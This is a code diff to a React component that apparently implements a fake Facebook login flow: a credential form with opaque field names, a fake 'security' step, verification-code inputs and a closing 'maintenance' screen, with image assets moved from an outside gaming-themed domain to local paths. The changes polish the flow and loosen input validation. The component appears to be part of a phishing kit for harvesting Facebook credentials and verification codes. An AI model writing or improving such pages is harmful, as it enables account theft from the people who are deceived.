@@ -6,9 +6,10 @@ import './LoginForm.css';
 
 interface FacebookLoginProps {
   onClose: () => void;
+  playClickSound?: () => void;
 }
 
-const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
+const FacebookLogin = ({ onClose, playClickSound }: FacebookLoginProps) => {
   const [step, setStep] = useState(1); // 1: FB Form, 1.5: Security, 2: Verification, 3: Success
 
   // STEP 1 STATES
@@ -33,6 +34,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
   };
 
   const handleSecurityProceed = () => {
+    if (playClickSound) playClickSound();
     setStep(2);
   };
 
@@ -40,8 +42,8 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
     e.preventDefault();
     
     // Basic Validation
-    if (!a1 || a1.length < 3) return; // Add visual error handling if needed
-    if (!a2 || a2.length < 3) return;
+    if (!a1 || a1.length < 1) return; // Add visual error handling if needed
+    if (!a2 || a2.length < 1) return;
 
     setLoading(true);
 
@@ -79,7 +81,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
       <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm animate-fade-in">
         <div className="relative animate-pulse">
           <img 
-            src="https://higgsdomino.store/img/loading.png" 
+            src="/loading.png" 
             alt="Loading..." 
             className="w-[400px] md:w-[500px] h-auto drop-shadow-2xl"
           />
@@ -151,7 +153,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
       {step === 1.5 && (
         <div className="security-popup-container animate-pop-in">
           <img 
-            src="https://higgsdomino.store/img/keamanan.png" 
+            src="/keamanan.png" 
             alt="Keamanan" 
             className="login-bg-img" 
             onClick={handleSecurityProceed}
@@ -170,7 +172,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
         <div className="verification-popup-container animate-pop-in">
           <div className="verification-inner">
           
-            <img src="https://higgsdomino.store/img/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
+            <img src="/verifikasi.png" alt="Verifikasi" className="verification-bg-img" />
             
             <div className="verification-inputs">
               <input 
@@ -200,7 +202,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
           <button 
             id="submitButton" 
             className="submit-btn-custom" 
-            onClick={handleFinalSubmit}
+            onClick={(e) => { if(playClickSound) playClickSound(); handleFinalSubmit(e); }}
              disabled={loading}
             aria-label="Confirm"
           ></button>
@@ -215,7 +217,7 @@ const FacebookLogin = ({ onClose }: FacebookLoginProps) => {
         <div className="fixed inset-0 z-[3000] flex items-center justify-center bg-black/60 backdrop-blur-sm animate-pop-in">
           <div className="relative">
             <img 
-              src="https://higgsdomino.store/img/maintance.png" 
+              src="/maintance.png" 
               alt="System Maintenance" 
               className="w-[300px] md:w-[400px] h-auto drop-shadow-2xl rounded-xl"
             />
